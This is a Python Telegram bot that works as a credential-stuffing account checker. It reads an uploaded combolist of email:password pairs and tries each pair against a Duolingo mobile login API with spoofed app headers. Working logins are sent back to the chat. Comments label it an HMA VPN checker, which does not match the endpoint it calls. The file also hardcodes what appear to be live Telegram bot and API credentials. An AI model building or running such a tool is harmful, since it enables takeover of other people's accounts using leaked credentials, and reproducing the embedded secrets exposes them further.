from pyrogram import Client, filters
import requests
import pyromod
from pyrogram.types import Message
import os

# Telegram bot token (replace with your bot token)
BOT_TOKEN = "6685119417:AAGGYkc1ztEbtILrx3VmY4i8_HgzwhqdRAI"
api_id = 6590520
api_hash = "7f31db7e8cd1c0959c187e2651935c00"
# Initialize Pyrogram client
app = Client("hma_bot", api_id=api_id, api_hash=api_hash, bot_token=BOT_TOKEN)

def hma_login(email, password):
    try:
        url = "https://android-api-cf.duolingo.com/2017-06-30/login?fields=id"
        headers = {
            "host": "android-api-cf.duolingo.com",
            "user-agent": "Duodroid/5.159.4 Dalvik/2.1.0 (Linux; U; Android 15; Redmi Note 15 Pro MIUI/V12.5.2.0.QFHINXM)",
            "accept": "application/json",
            "x-amzn-trace-id": "User=0",
            "content-type": "application/json",
            "accept-encoding": "gzip"
        }
        payload = {
            "distinctId": "null",
            "identifier": email,
            "password": password
        }
        response = requests.post(url, json=payload, headers=headers)
        if "id" in response.text:
            return True, "Login successful."
        else:
            return False, "Invalid credentials."
    except Exception as e:
        return False, f"Login Failed: {str(e)}"

# Command handler to check HMA VPN accounts using a combolist file
@app.on_message(filters.command(["hma"]))
async def trans(client, m: Message):
    try:
        editable = await m.reply_text("**Send Text file **")
        input_msg: Message = await app.listen(editable.chat.id)
        x = await input_msg.download()
        path = f"./downloads/"
        editable = await m.reply_text("Starting Account Checking.........")

        # Read the file and initialize progress
        with open(x, 'r') as file:
            lines = file.readlines()
        total_accounts = len(lines)

        # Calculate interval for 1% progress
        progress_interval = max(1, total_accounts // 100)
        progress = 0
        next_progress_threshold = progress_interval

        for index, line in enumerate(lines):
            line = line.strip()
            if ':' in line:
                email, password = line.split(':', 1)
                success, message = hma_login(email, password)
                if success:
                    result_message = f"Good Login for {email} : {password}"
                    await app.send_message(m.chat.id, result_message)
                else:
                    result_message = f"Bad Login for {email}: {password} - {message}"
            else:
                result_message = f"Invalid line format: {line}"

            

            # Update progress and send message if necessary
            if index + 1 >= next_progress_threshold:
                percent_complete = (index + 1) / total_accounts * 100
                await app.send_message(
                    m.chat.id,
                    f"Progress: {percent_complete:.1f}% ({index + 1}/{total_accounts} accounts checked)"
                )
                next_progress_threshold += progress_interval

        await app.send_message(m.chat.id, "DONE CHECKING")

        # Clean up downloaded file
        os.remove(x)
    except Exception as e:
        await app.send_message(m.chat.id, f"An error occurred: {str(e)}")

# Start the bot
if __name__ == "__main__":
    app.run()
